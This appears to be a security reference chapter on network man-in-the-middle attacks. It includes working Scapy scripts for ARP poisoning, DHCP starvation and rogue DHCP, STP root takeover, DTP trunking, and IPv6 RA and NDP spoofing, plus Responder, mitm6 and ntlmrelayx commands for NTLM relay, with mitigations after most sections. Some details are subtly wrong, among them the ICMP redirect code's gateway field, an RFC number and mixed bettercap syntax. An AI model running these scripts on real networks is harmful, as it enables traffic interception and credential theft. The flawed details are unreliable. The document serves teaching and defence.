# Network Attacks and Man-in-the-Middle

## ARP Spoofing and Poisoning

### ARP Protocol Fundamentals

The Address Resolution Protocol maps IP addresses to MAC addresses — with zero authentication:

```
┌──────────────────────────────────────────────────────────────┐
│                    ARP PROTOCOL                                 │
│                                                               │
│  ARP resolves IP → MAC (broadcast):                           │
│  "Who has 192.168.1.1? Tell 192.168.1.100"                    │
│                                                               │
│  ARP Reply (unicast):                                         │
│  "192.168.1.1 is at AA:BB:CC:DD:EE:FF"                       │
│                                                               │
│  Gratuitous ARP:                                               │
│  "I am 192.168.1.1 at AA:BB:CC:DD:EE:FF" (unsolicited)      │
│                                                               │
│  ARP is STATELESS and TRUSTLESS:                               │
│  - Hosts accept ARP replies even without sending requests     │
│  - No verification of ARP message authenticity                │
│  - No sequence numbers or timestamps                          │
│  - ARP cache overwrites on every reply (last-write-wins)      │
│                                                               │
│  ARP Packet Structure:                                         │
│  ┌──────────┬──────────┬─────────────────────────┐           │
│  │ HTYPE    │ PTYPE    │ HLEN  │ PLEN │ OPER     │           │
│  │ (1=Ether)│ (0x0800) │ (6)   │ (4)  │ (1-4)   │           │
│  ├──────────┴──────────┼─────────────────────────┤           │
│  │ SHA (Sender MAC)    │ SPA (Sender IP)          │           │
│  ├─────────────────────┼─────────────────────────┤           │
│  │ THA (Target MAC)    │ TPA (Target IP)          │           │
│  └─────────────────────┴─────────────────────────┘           │
│                                                               │
│  OPER values: 1=Request, 2=Reply, 3=Reverse Request,           │
│               4=Reverse Reply                                 │
└──────────────────────────────────────────────────────────────┘
```

### ARP Spoofing Attack

```
┌──────────────────────────────────────────────────────────────┐
│               ARP SPOOFING / POISONING                         │
│                                                               │
│  Network (Normal):                                             │
│  ┌────────┐         ┌────────┐         ┌────────┐            │
│  │ Victim │─────────│ Switch │─────────│ Server │            │
│  │.1.100  │         │        │         │.1.1    │            │
│  └────────┘         └────────┘         └────────┘            │
│                                                               │
│  ARP Table (Victim): Gateway=.1.1 → MAC_router               │
│  ARP Table (Server): Victim=.1.100 → MAC_victim               │
│                                                               │
│  Attack (Attacker sends gratuitous ARP):                      │
│  Attacker → Broadcast: "192.168.1.1 is at MAC_attacker"      │
│  Attacker → Broadcast: "192.168.1.100 is at MAC_attacker"    │
│                                                               │
│  ARP Table (Victim): Gateway=.1.1 → MAC_attacker ✗           │
│  ARP Table (Server): Victim=.1.100 → MAC_attacker ✗          │
│                                                               │
│  Traffic Flow:                                                │
│  Victim → Attacker → Server (MITM!)                          │
│  Server → Attacker → Victim (MITM!)                          │
│                                                               │
│  ┌────────┐     ┌────────┐     ┌────────┐     ┌────────┐   │
│  │ Victim │────►│Attacker│────►│ Switch │────►│ Server │   │
│  └────────┘     │(MITM)  │     └────────┘     └────────┘   │
│                  │forward │                                   │
│                  │ packets│                                   │
│                  └────────┘                                   │
└──────────────────────────────────────────────────────────────┘
```

```python
from scapy.all import *

def arp_spoof(target_ip, gateway_ip, interface):
    """ARP spoofing attack — MITM between target and gateway"""
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Poison target: "I am the gateway"
    pkt_target = Ether(dst=target_mac) / \
                 ARP(op=2,
                     pdst=target_ip,
                     hwdst=target_mac,
                     psrc=gateway_ip,      # Claim to be gateway
                     hwsrc=get_if_hwaddr(interface))
    
    # Poison gateway: "I am the target"
    pkt_gateway = Ether(dst=gateway_mac) / \
                  ARP(op=2,
                      pdst=gateway_ip,
                      hwdst=gateway_mac,
                      psrc=target_ip,        # Claim to be target
                      hwsrc=get_if_hwaddr(interface))
    
    while True:
        sendp(pkt_target, iface=interface, verbose=0)
        sendp(pkt_gateway, iface=interface, verbose=0)
        time.sleep(2)

def arp_restore(target_ip, gateway_ip, interface):
    """Restore ARP tables to original state"""
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    pkt = Ether(dst=target_mac) / \
          ARP(op=2,
              pdst=target_ip,
              hwdst=target_mac,
              psrc=gateway_ip,
              hwsrc=gateway_mac)
    sendp(pkt, iface=interface)
```

### ARP Spoofing Detection and Mitigation

```bash
# Detection: Monitor ARP table for changes
arpwatch  # Daemon that logs ARP changes
arp -a    # Manual ARP table inspection

# Detection: Use arpwatch or custom scripts
arpwatch -i eth0  # Logs MAC/IP changes

# Scapy-based ARP monitoring
from scapy.all import *
def monitor_arp(pkt):
    if pkt.haslayer(ARP):
        if pkt[ARP].op == 2:  # ARP reply
            print(f"ARP: {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")

sniff(prn=monitor_arp, filter="arp", store=0)

# Mitigation: Dynamic ARP Inspection (DAI)
# Cisco switch configuration
ip arp inspection vlan 1-100
ip arp inspection validate src-mac dst-mac ip
ip arp inspection filter arp-acl vlan 1

# Mitigation: Static ARP entries (not scalable)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# Mitigation: Port security
switchport port-security
switchport port-security maximum 1
switchport port-security violation shutdown

# Linux: arptables
arptables -A INPUT -s 192.168.1.1 --source-mac AA:BB:CC:DD:EE:FF -j ACCEPT
arptables -A INPUT -j DROP
```

## DHCP Starvation and Rogue DHCP

### DHCP Starvation Attack

```
┌──────────────────────────────────────────────────────────────┐
│                DHCP STARVATION ATTACK                           │
│                                                               │
│  DHCP pool has limited addresses (e.g., 192.168.1.100-200)   │
│                                                               │
│  Normal:                                                       │
│  Client → DHCP Discover → DHCP Offer → DHCP Request → ACK    │
│                                                               │
│  Attack: Flood DHCP with fake requests                        │
│  Attacker sends thousands of DHCP DISCOVER messages           │
│  with random MAC addresses → exhausts DHCP pool               │
│                                                               │
│  ┌──────┐                    ┌──────────┐                     │
│  │Attack│──DISCOVER(MAC_1)──►│DHCP Server│                    │
│  │      │──DISCOVER(MAC_2)──►│ (pool:    │                    │
│  │      │──DISCOVER(MAC_3)──►│  100 IPs) │                    │
│  │      │──DISCOVER(MAC_4)──►│           │                    │
│  │      │──DISCOVER(...)────►│           │                    │
│  │      │──DISCOVER(MAC_100)►│ EXHAUSTED │                    │
│  └──────┘                    └──────────┘                     │
│                                                               │
│  New legitimate clients cannot obtain IP addresses            │
│  DHCP pool exhausted → DoS or...                              │
│                                                               │
│  ...enables Rogue DHCP Server attack:                         │
│  Attacker sets up rogue DHCP server:                          │
│  ┌──────┐                    ┌──────────┐                     │
│  │Rogue │◄──DHCP DISCOVER────│ Client   │                     │
│  │DHCP  │───DHCP OFFER──────►│ (starved)│                    │
│  │Server│───DHCP ACK─────────►│          │                    │
│  │      │   IP: 10.0.0.100   │          │                   │
│  │      │   GW: 10.0.0.1     │          │                   │
│  │      │   DNS: 10.0.0.1    │          │  ← All traffic    │
│  │  10.0.0.1                 │          │  goes to attacker  │
│  └──────┘                    └──────────┘                     │
│                                                               │
│  Rogue DHCP assigns:                                           │
│  - Attacker's IP as default gateway → MITM                   │
│  - Attacker's IP as DNS server → DNS spoofing               │
│  - Attacker's IP as WPAD server → proxy hijacking              │
│  - Invalid subnet mask → routing confusion                    │
└──────────────────────────────────────────────────────────────┘
```

```python
from scapy.all import *

def dhcp_starvation(interface):
    """DHCP starvation attack — exhaust DHCP pool"""
    for i in range(1000):
        mac = RandMAC()
        
        # DHCP Discover
        discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=mac) / \
                   DHCP(options=[("message-type", "discover"),
                                 ("param_req_list", [1, 3, 6, 15, 28]),
                                 "end"])
        sendp(discover, iface=interface, verbose=0)

def rogue_dhcp(interface, rogue_ip, gateway_ip, dns_ip, pool_start, pool_end):
    """Rogue DHCP server — MITM via default gateway"""
    while True:
        pkt = sniff(iface=interface, filter="udp port 67 and udp port 68",
                    count=1)[0]
        
        if pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            requested_ip = pkt[BOOTP].ciaddr or pool_start
            
            offer = Ether(src=get_if_hwaddr(interface),
                         dst=pkt[Ether].src) / \
                    IP(src=rogue_ip, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2,
                          yiaddr=requested_ip,
                          siaddr=rogue_ip,
                          giaddr="0.0.0.0",
                          chaddr=pkt[BOOTP].chaddr) / \
                    DHCP(options=[("message-type", "offer"),
                                 ("subnet_mask", "255.255.255.0"),
                                 ("router", gateway_ip),  # Attacker IP!
                                 ("name_server", dns_ip),  # Attacker IP!
                                 ("lease_time", 86400),
                                 "end"])
            sendp(offer, iface=interface, verbose=0)
```

### DHCP Spoofing Countermeasures

```bash
# Cisco DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 1-100
# Trust DHCP server ports
interface GigabitEthernet0/1
 description DHCP Server
 ip dhcp snooping trust
# Untrusted ports: drop DHCP offers and restrict rate
interface GigabitEthernet0/2
 description Access Port
 ip dhcp snooping limit rate 10  # 10pps max
# Verify: show ip dhcp snooping binding

# DHCP option 82 (relay agent information)
# Inserts switch port info into DHCP requests
ip dhcp snooping information option

# Linux: DHCP quarantine with ebtables
ebtables -A INPUT --protocol ipv4 --p-destination-udp 67 -j DROP
# Only allow DHCP from trusted server MAC
ebtables -A INPUT --protocol ipv4 --p-destination-udp 67 \
  --source ! AA:BB:CC:DD:EE:FF -j DROP
```

## VLAN Hopping

### 802.1Q Double Tagging

```
┌──────────────────────────────────────────────────────────────┐
│            VLAN HOPPING — DOUBLE TAGGING                       │
│                                                               │
│  Switch trunk port strips outer tag, forwards inner tag:       │
│                                                               │
│  ┌────────┐  ┌──────────┐            ┌──────────┐ ┌────────┐│
│  │Attacker│  │ Switch 1 │            │ Switch 2 │ │ Victim ││
│  │VLAN 1  │  │ (trunk)  │            │ (trunk)  │ │VLAN 10 ││
│  │(native)│  │          │            │          │ │        ││
│  └───┬────┘  └────┬─────┘            └────┬─────┘ └───┬────┘│
│      │             │                       │            │     │
│  Attacker sends double-tagged frame:                           │
│  ┌──────────┬──────────┬──────────┬─────────────────────┐     │
│  │ Outer 802│ Inner 802│ Payload  │ Ethernet Frame       │     │
│  │ .1Q Tag │ .1Q Tag  │          │                      │     │
│  │ VLAN 1  │ VLAN 10  │          │                      │     │
│  │(native) │ (target) │          │                      │     │
│  └──────────┴──────────┴──────────┴─────────────────────┘     │
│                                                               │
│  Step 1: Switch 1 receives frame on access port (VLAN 1)      │
│          Strips outer tag (VLAN 1 = native VLAN)              │
│          Forwards frame with inner tag (VLAN 10)              │
│                                                               │
│  Step 2: Switch 2 receives frame on trunk (VLAN 10 tagged)    │
│          Forwards to VLAN 10 access ports                      │
│          Victim receives frame!                                │
│                                                               │
│  Response: Victim replies (single tag VLAN 10) → forwarded  │
│  back through trunk. But attacker cannot receive response     │
│  (one-way communication, or use other techniques for 2-way)  │
│                                                               │
│  Requirements:                                                │
│  - Attacker on native VLAN of trunk                           │
│  - Trunk allows target VLAN                                   │
│  - Switch doesn't filter double-tagged frames                 │
│                                                               │
│  Mitigation:                                                  │
│  - Never use VLAN 1 for access ports                          │
│  - Change native VLAN on trunks to unused VLAN                │
│  switchport trunk native vlan 999                              │
│  - Disable DTP negotiation                                    │
│  switchport nonegotiate                                        │
│  - Tag native VLAN on trunk                                   │
│  vlan dot1q tag native                                         │
│  - Enforce VLAN ACLs                                          │
└──────────────────────────────────────────────────────────────┘
```

### Switch Spoofing (DTP Attack)

```python
from scapy.all import *

def switch_spoof(interface):
    """
    Exploit DTP (Dynamic Trunking Protocol) to negotiate trunk
    Many switches default to 'dynamic desirable' or 'dynamic auto'
    """
    # DTP frame: LLC + SNAP + DTP
    # DTP announces desire to trunk
    # Switch responds by enabling trunk mode
    
    # Method 1: Send DTP frames to negotiate trunk
    dtp = Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(interface)) / \
          LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
          SNAP(OUI=0x000c, code=0x2004) / \
          Raw(load=b'\x01\x02')  # DTP DESIRABLE
    
    sendp(dtp, iface=interface)
    
    # After trunk established, send 802.1Q tagged frames
    # to any VLAN allowed on the trunk
    # 

# Method 2: Use Yersinia for DTP negotiation
# yersinia dtp -attack 1 -interface eth0

# Mitigation:
# switchport mode access        # Force access mode
# switchport nonegotiate         # Disable DTP
# switchport access vlan 10      # Assign specific VLAN
```

## STP Manipulation

```
┌──────────────────────────────────────────────────────────────┐
│           STP MANIPULATION ATTACKS                             │
│                                                               │
│  Spanning Tree Protocol (802.1D) prevents loops by:          │
│  1. Electing root bridge (lowest bridge ID wins)              │
│  2. Blocking redundant links (creating tree topology)         │
│  3. Unblocking links on failure (topology change)              │
│                                                               │
│  Root Bridge Takeover:                                        │
│  1. Attacker sends BPDU with lower priority than current root │
│  2. All switches reconverge around attacker's bridge          │
│  3. Attacker becomes root bridge                              │
│  4. All traffic flows through attacker                        │
│                                                               │
│  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐           │
│  │Normal  │  │Switch1 │  │Switch2 │  │Switch3 │           │
│  │Root    │  │Block   │  │Forward │  │Forward │           │
│  │Prio:   │  │        │  │        │  │        │           │
│  │32768   │  │        │  │        │  │        │           │
│  └────────┘  └────────┘  └────────┘  └────────┘           │
│                                                               │
│  After attack:                                                │
│  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐           │
│  │Attacker│  │Root    │  │Forward  │  │Forward │           │
│  │Prio:0  │◄─│        │◄─│        │◄─│        │           │
│  │MITM    │  │        │  │        │  │        │           │
│  └────────┘  └────────┘  └────────┘  └────────┘           │
│  All traffic flows through attacker (new root bridge)         │
│                                                               │
│  BPDU Guard & Root Guard:                                     │
│  # BPDU Guard: Disable port receiving BPDUs                   │
│  spanning-tree portfast bpduguard                             │
│  # Root Guard: Prevent superior BPDU from becoming root      │
│  spanning-tree guard root                                     │
│  # BPDU Filter: Don't send/receive BPDUs on port             │
│  spanning-tree bpdufilter enable                              │
└──────────────────────────────────────────────────────────────┘
```

```python
from scapy.all import *

def stp_root_bridge_takeover(interface):
    """Become root bridge by sending BPDU with priority 0"""
    my_mac = get_if_hwaddr(interface)
    
    bpdu = Ether(dst="01:80:c2:00:00:00") / \
           LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
           STP(rootid=0,      # Priority 0 (lowest wins)
               rootmac=my_mac,
               bridgeid=0,
               bridgemac=my_mac,
               portid=0x8001,
               pathcost=0,     # Zero path cost (root is directly connected)
               maxage=20,
               hellotime=2,
               forwarddelay=15)
    
    # Continuously send BPDUs to maintain root status
    while True:
        sendp(bpdu, iface=interface, verbose=0)
        time.sleep(2)  # BPDU hello time

# STP topology change DoS
def stp_topology_change(interface):
    """Force STP topology change (TCN flood)"""
    my_mac = get_if_hwaddr(interface)
    
    tcn = Ether(dst="01:80:c2:00:00:00") / \
          LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
          STP(proto=0, version=0, bpdutype=0x80)  # TCN BPDU
    
    # Flood TCN to cause MAC table aging and re-convergence
    while True:
        sendp(tcn, iface=interface, verbose=0)
        time.sleep(0.1)  # Rapid TCN flood
```

## NAC Bypass

```
┌──────────────────────────────────────────────────────────────┐
│                   NAC BYPASS TECHNIQUES                         │
│                                                               │
│  Network Access Control (NAC) validates device posture          │
│  before granting network access. Several bypass methods:       │
│                                                               │
│  1. MAC Spoofing:                                             │
│     # Spoof MAC of already-authenticated device               │
│     ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF                  │
│     # Or: ip link set dev eth0 address AA:BB:CC:DD:EE:FF      │
│                                                               │
│  2. 802.1X Bypass (if MAB fallback):                          │
│     Wait for 802.1X timeout → switch falls back to MAB      │
│     Spoof MAC of known device → bypass NAC                     │
│                                                               │
│  3. Hub/Multiport Adapter:                                    │
│     Plug hub between switch and authenticated device           │
│     Hub connects attacker + authenticated device               │
│     Switch sees single authenticated MAC                      │
│                                                               │  ┌────────┐ ┌──────┐
│     Switch ── Hub ──┤─ Authenticated Device                   │  │ Hub    │ │Attack│
│                     └─ Attacker Device                        │  └────────┘ └──────┘
│                                                               │
│  4. VLAN Hoisting:                                            │
│     Set NIC to trunk mode, tag packets with privileged VLAN    │
│     If switch allows trunk, access restricted VLAN            │
│                                                               │
│  5. DHCP Starvation + Rogue DHCP:                             │
│     Exhaust DHCP pool, set up rogue DHCP server                │
│     (See DHCP attacks above)                                   │
│                                                               │
│  6. DNS Proxy via 802.1X MAB:                                 │
│     Provision device with valid DNS via mDNS/LLMNR             │
│     Spoof required posture agent responses                    │
│                                                               │
│  7. Persistent Agent Bypass:                                   │
│     Reverse engineer NAC agent                                 │
│     Forge posture reports (OS version, AV status, etc.)       │
│     # Tool: NAC-Killer (agent bypass framework)               │
│                                                               │
│  8. iPXE Attack:                                               │
│     Boot from network (PXE) without NAC agent                  │
│     Use custom iPXE script that doesn't enforce NAC           │
│                                                               │
│  # MAC flooding to bypass port security:                      │
│  macchanger -r eth0  # Random MAC                              │
│  # If MAC limit is 1, flood then use legitimate MAC            │
│  for i in $(seq 1 100); do                                    │
│    macchanger -r eth0                                          │
│    dhclient -r eth0 && dhclient eth0                          │
│  done                                                          │
└──────────────────────────────────────────────────────────────┘
```

## IPv6 Attacks

### SLAAC and RA Spoofing

```
┌──────────────────────────────────────────────────────────────┐
│                IPv6 ATTACKS                                     │
│                                                               │
│  SLAAC (Stateless Address Autoconfiguration):                  │
│  Router Advertisements (RA) configure IPv6 addresses          │
│  No authentication — anyone can send RAs!                     │
│                                                               │
│  ┌────────┐              ┌────────┐              ┌────────┐│
│  │Attacker│── RA ───────►│ Switch │──────────────►│ Client ││
│  │        │  (rogue RA)   │        │              │        ││
│  └────────┘              └────────┘              └────────┘│
│  RA contains:                                                 │
│  - Router lifetime: 9000 seconds                              │
│  - Prefix: 2001:db8:dead::/64                                │
│  - Default gateway: Attacker's link-local                    │
│  - DNS server: Attacker's address                            │
│  - MTU: 1280 (causes fragmentation issues)                  │
│                                                               │
│  Client autoconfigures:                                       │
│  1. Receives RA with prefix 2001:db8:dead::/64               │
│  2. Generates Interface ID (EUI-64 or random)                 │
│  3. Configures: 2001:db8:dead::xx:xx:xx:xx                   │
│  4. Default route → Attacker's link-local                    │
│  5. DNS queries → Attacker's DNS                             │
│  → Complete MITM achieved!                                    │
└──────────────────────────────────────────────────────────────┘
```

```python
from scapy.all import *

def ipv6_ra_spoof(interface, prefix, dns_server):
    """IPv6 Router Advertisement spoofing — MITM via SLAAC"""
    src_ll = get_if_hwaddr(interface)
    
    # Get link-local address
    src_ip = get_if_addr6(interface)
    
    # Craft rogue RA
    ra = Ether(src=src_ll, dst="33:33:00:00:00:01") / \
         IPv6(src=src_ip, dst="ff02::1") / \
         ICMPv6ND_RA(
             routerlifetime=9000,
             reachtime=0,
             retranstimer=0,
             flags=0x08  # Managed flag
         ) / \
         ICMPv6NDPrefixInfo(
             prefix=prefix,
             prefixlen=64,
             validlifetime=86400,
             preferredlifetime=14400,
             L=1, A=1  # On-link, Autoconfig
         ) / \
         ICMPv6NDOptsRDNSS(dns=[dns_server])
    
    # Send RA continuously
    while True:
        sendp(ra, iface=interface, verbose=0)
        time.sleep(5)  # RA interval

def ipv6_ndp_spoof(interface, target_ipv6, gateway_ipv6):
    """IPv6 NDP spoofing — similar to ARP spoofing for IPv6"""
    target_mac = getmacbyip6(target_ipv6)
    gateway_mac = getmacbyip6(gateway_ipv6)
    
    # Neighbor Advertisement: "gateway is at attacker's MAC"
    na_gateway = Ether(dst=target_mac) / \
                 IPv6(src=gateway_ipv6, dst=target_ipv6) / \
                 ICMPv6ND_NA(
                     R=1, S=1, O=1,
                     tgt=gateway_ipv6
                 ) / \
                 ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
    
    # Neighbor Advertisement: "target is at attacker's MAC"
    na_target = Ether(dst=gateway_mac) / \
                IPv6(src=target_ipv6, dst=gateway_ipv6) / \
                ICMPv6ND_NA(
                    R=1, S=1, O=1,
                    tgt=target_ipv6
                ) / \
                ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr(interface))
    
    while True:
        sendp(na_gateway, iface=interface, verbose=0)
        sendp(na_target, iface=interface, verbose=0)
        time.sleep(3)
```

### NDP Spoofing and IPv6 MITM

```
┌──────────────────────────────────────────────────────────────┐
│             MITM6 (IPv6 MITM TOOL)                              │
│                                                               │
│  mitm6 by Fox-IT: Spoofes DHCPv6 and IPv6 routing             │
│  Combined with ntlmrelayx for credential relay               │
│                                                               │
│  Attack chain:                                                │
│  1. mitm6 spoofs IPv6 DNS (DHCPv6)                           │
│  2. Victim gets IPv6 address from attacker                    │
│  3. Victim queries attacker's DNS (IPv6 preferred over IPv4) │
│  4. DNS responds with attacker's IP for WPAD/Intranet         │
│  5. Victim authenticates to attacker's server                  │
│  6. ntlmrelayx relays NTLM auth to target server             │
│                                                               │
│  # mitm6 attack                                               │
│  mitm6 -d lab.local                                           │
│  # Combined with ntlmrelayx                                  │
│  ntlmrelayx -6 -t ldaps://dc.lab.local -wh attacker-dns      │
│                                                               │
│  IPv6 attack mitigation:                                      │
│  - RA Guard (RFC 6106): Block RAs on access ports             │
│  - DHCPv6 Guard: Block rogue DHCPv6 responses                 │
│  - IPv6 routing policy: Prefer IPv4 when IPv6 not needed      │
│  - RA TLS (experimental): Authenticate RAs                    │
│  - SEND (Secure Neighbor Discovery): Cryptographic NDP        │
│  - Disable IPv6 if not used (ipv6 disable)                    │
└──────────────────────────────────────────────────────────────┘
```

## Responder and Cross-Protocol Attacks

### Responder — LLMNR/NBT-NS/mDNS Poisoning

```
┌──────────────────────────────────────────────────────────────┐
│         RESPONDER — MULTI-PROTOCOL POISONING                   │
│                                                               │
│  Windows name resolution fallback:                             │
│  1. DNS (UDP 53) — try first                                  │
│  2. LLMNR (UDP 5355) — try if DNS fails (multicast)           │
│  3. NBT-NS (UDP 137) — try if LLMNR fails (broadcast)        │
│  4. mDNS (UDP 5353) — try if others fail (multicast)          │
│                                                               │
│  Responder spoofs ALL of these:                               │
│                                                               │
│  Victim: "Where is FILESVR?"                                   │
│  DNS: "No such host" (NXDOMAIN)                               │
│  LLMNR: "FILESVR is at ATTACKER" ← Responder reply            │
│  Victim connects to attacker's SMB share                      │
│  Victim sends NTLM authentication                            │
│  Attacker captures NTLM hash → crack or relay                │
│                                                               │
│  # Responder usage                                            │
│  responder -I eth0 -wrf                                       │
│  # -w: WPAD proxy auth capture                                │
│  # -r: SMB redirect                                           │
│  # -f: fingerprint hosts                                      │
│                                                               │
│  Protocols targeted by Responder:                              │
│  ┌──────────────────────────────────────────────┐            │
│  │ LLMNR    (5355/UDP) — Name resolution        │            │
│  │ NBT-NS   (137/UDP) — NetBIOS name resolution │            │
│  │ DNS      (53/UDP)  — DNS poisoning            │            │
│  │ mDNS     (5353/UDP)— Multicast DNS            │            │
│  │ SMB      (445/TCP) — NTLM auth capture       │            │
│  │ HTTP     (80/TCP)  — NTLM auth capture       │            │
│  │ HTTPS    (443/TCP) — NTLM auth capture       │            │
│  │ LDAP     (389/TCP) — NTLM auth capture       │            │
│  │ FTP      (21/TCP)  — Credential capture      │            │
│  │ IMAP     (143/TCP) — Credential capture      │            │
│  │ POP3     (110/TCP) — Credential capture      │            │
│  │ SMTP     (25/TCP)  — Credential capture      │            │
│  │ MSSQL    (1433/TCP)— Credential capture       │            │
│  │ WPAD     (Auto)   — Proxy auth capture        │            │
│  └──────────────────────────────────────────────┘            │
│                                                               │
│  SMB Relay Attack Chain:                                       │
│  1. Responder captures NTLM hash                              │
│  2. ntlmrelayx relays to target server                        │
│  3. Target server authenticates relay                          │
│  4. Attacker gains access to target                            │
│                                                               │
│  # SMB relay with ntlmrelayx                                 │
│  ntlmrelayx -t smb://target_server -smb2support               │
│  # Relay to LDAP for domain escalation                         │
│  ntlmrelayx -t ldaps://dc01.lab.local                          │
│                                                               │
│  Mitigation:                                                  │
│  - Disable LLMNR: GPO → Computer Config → Admin Templates →  │
│    Network → DNS Client → Turn off Multicast Resolution        │
│  - Disable NBT-NS: Network adapter properties → TCP/IP →      │
│    Advanced → WINS → Disable NetBIOS over TCP/IP               │
│  - Enable SMB signing (prevents relay)                        │
│  - Use LDAP signing and channel binding                       │
│  - EDR detection of Responder activity (port binding)          │
└──────────────────────────────────────────────────────────────┘
```

## Bettercap — Modern MITM Framework

```bash
# Bettercap — comprehensive network attack framework

# ARP spoofing MITM
bettercap -T 192.168.1.100 -X

# DNS spoofing
bettercap -T 192.168.1.0/24 --dns-spoofing

# Set up DNS spoofing rules in /usr/share/bettercap/caplets/dns-spoof.cap
# or specify:
set dns.spoof.domains example.com,*.example.com
set dns.spoof.address 192.168.1.200

# HTTPS stripping (similar to sslstrip)
bettercap -T 192.168.1.100 --http-0x20-spoofing

# Packet capture
net.sniff on
net.sniff filter "tcp port 80"

# DHCP spoofing
set dhcp.spoof.address 192.168.1.200
dhcp.spoof on

# Combined attack script
# bettercap -T 192.168.1.0/24 -X --dns-spoofing --http-0x20-spoofing
```

## ICMP Redirect and Route Manipulation

```
┌──────────────────────────────────────────────────────────────┐
│             ICMP REDIRECT ATTACKS                                │
│                                                               │
│  ICMP Redirect: Router informs host of better route            │
│  "Use 192.168.1.200 as gateway for 10.0.0.0/8"                │
│                                                               │
│  Attack:                                                       │
│  1. Attacker sends forged ICMP redirect to victim             │
│  2. Victim adds temporary route via attacker                  │
│  3. Traffic for specified destination flows through attacker │
│                                                               │
│  ┌────────┐  ICMP Redirect   ┌──────────┐                    │
│  │ Victim │◄─────────────────│ Attacker │                    │
│  │        │ "Use attacker as │          │                    │
│  │        │  gateway"         │          │                    │
│  └───┬────┘                   └────┬─────┘                    │
│      │                             │                          │
│      │ Traffic to 10.0.0.0/8       │ (MITM)                  │
│      └──────────────►──────────────►┘                          │
│                     Attacker forwards                         │
│                                                               │
│  # ICMP redirect attack with scapy                            │
│  from scapy.all import *                                       │
│  def icmp_redirect(victim_ip, gateway_ip, target_net):        │
│      victim_mac = getmacbyip(victim_ip)                       │
│      pkt = Ether(dst=victim_mac) / \                           │
│            IP(src=gateway_ip, dst=victim_ip) / \               │
│            ICMP(type=5, code=1, \  # Redirect for host        │
│                gw=victim_ip) / \                               │
│            IP(src=victim_ip, dst=target_net)                  │
│      sendp(pkt, verbose=0)                                    │
│                                                               │
│  Mitigation:                                                  │
│  - Linux: sysctl net.ipv4.conf.all.accept_redirects=0         │
│  - Windows: Group Policy → Ignore ICMP redirects              │
│  - Router: Disable ICMP redirects on interfaces              │
│  - no ip redirects (Cisco)                                     │
│                                                               │
│  Other ICMP attacks:                                           │
│  - ICMP unreachable: DoS by telling host services are down    │
│  - ICMP timestamp: Information disclosure (system time)      │
│  - ICMP mask: Network mask disclosure                          │
│  - PMTU discovery: MTU manipulation for fragmentation attacks │
└──────────────────────────────────────────────────────────────┘
```

## PPPoE Discovery Attacks

```
┌──────────────────────────────────────────────────────────────┐
│             PPPOE DISCOVERY ATTACKS                             │
│                                                               │
│  PPPoE (Point-to-Point Protocol over Ethernet):                │
│  Discovery phase: PADI → PADO → PADR → PADS                   │
│                                                               │
│  Attack: Rogue PPPoE Access Concentrator                      │
│  1. Attacker sends PADO (PPPoE Active Discovery Offer)        │
│  2. Victim connects to attacker's PPPoE server                 │
│  3. Attacker authenticates victim (captures credentials)       │
│  4. Man-in-the-middle established                              │
│                                                               │
│  # PPPoE discovery with scapy                                 │
│  from scapy.all import *                                        │
│  from scapy.layers.ppp import PPPoE, PPPoED                   │
│                                                               │
│  # Send PADI (discovery init)                                 │
│  padi = Ether(dst="ff:ff:ff:ff:ff:ff") / \                   │
│         PPPoED(version=1, type=1, code=0x09) / \              │
│         PPPoETag(tag_type=0x0101, tag_value=b'service')      │
│  sendp(padi, iface=interface)                                  │
│                                                               │
│  # Or act as rogue AC:                                         │
│  # Listen for PADI, respond with PADO                         │
│  # Capture PPP credentials during authentication              │
│                                                               │
│  Mitigation: PPPOE authentication (CHAP), 802.1X              │
└──────────────────────────────────────────────────────────────┘
```

## NDMP Attacks

```
┌──────────────────────────────────────────────────────────────┐
│           NDMP (NETWORK DATA MANAGEMENT PROTOCOL)             │
│                                                               │
│  NDMP (port 10000/TCP) used for network backup               │
│  Sends backup data in CLEARTEXT                                │
│                                                               │
│  Attack: Capture NDMP traffic for data exfiltration           │
│  - Credentials sent in cleartext                               │
│  - Backup data (files, databases) in cleartext               │
│  - File metadata (paths, sizes, permissions) in cleartext     │
│                                                               │
│  # Capture NDMP traffic                                       │
│  tcpdump -i eth0 port 10000 -w ndmp_capture.pcap             │
│                                                               │
│  # Filter NDMP auth in Wireshark                              │
│  ndmp.message_type == 1 && ndmp.auth_type == 0                │
│                                                               │
│  Mitigation:                                                 │
│  - Use NDMPv4 with authentication                            │
│  - Encrypt NDMP traffic (IPsec tunnel)                        │
│  - Restrict NDMP access to backup network only                │
│  - Use NDMO (NDMP over TLS) where supported                  │
└──────────────────────────────────────────────────────────────┘
```

**Cross-references**: See `03a_wifi_bluetooth_security.md` for wireless MITM attacks, `01a_network_architecture_security.md` for network architecture defenses, `05a_firewall_ids_ips.md` for IDS/IPS detection of these attacks, `05b_network_hardening_zero_trust.md` for DAI and DHCP snooping configuration, and `02a_dns_security.md` for DNS-level attacks used in combination with MITM.

## References

1. RFC 826 — An Ethernet Address Resolution Protocol. D. Plummer, IETF, November 1982.
2. RFC 2131 — Dynamic Host Configuration Protocol. R. Droms, IETF, March 1997.
3. IEEE 802.1Q — Virtual Bridged Local Area Networks. IEEE, 2018.
4. IEEE 802.1D — Spanning Tree Protocol. IEEE, 2004.
5. IEEE 802.1X — Port-Based Network Access Control. IEEE, 2010.
6. RFC 4861 — Neighbor Discovery for IP version 6 (NDP). T. Narten et al., IETF, September 2007.
